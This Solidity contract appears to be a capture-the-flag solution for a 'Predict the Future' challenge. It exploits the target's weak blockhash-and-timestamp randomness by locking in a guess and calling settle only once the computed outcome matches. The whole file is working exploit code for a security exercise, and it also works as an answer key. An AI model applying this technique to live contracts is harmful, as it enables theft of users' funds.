pragma solidity ^0.4.21;

import '../PredictTheFutureChallenge.sol';

contract PredictTheFutureAttack {
  PredictTheFutureChallenge challenge;
  uint256 startBlock;

  function PredictTheFutureAttack(address _challenge) public payable {
    challenge = PredictTheFutureChallenge(_challenge);
  }

  function start() external payable {
    // 9 -> one of 10 possible choices
    startBlock = block.number;
    challenge.lockInGuess.value(1 ether)(9);
  }

  function finish() external {
    require(block.number > startBlock + 1);
    require(uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 9);

    challenge.settle();
  }

  function() external payable {
  }
}
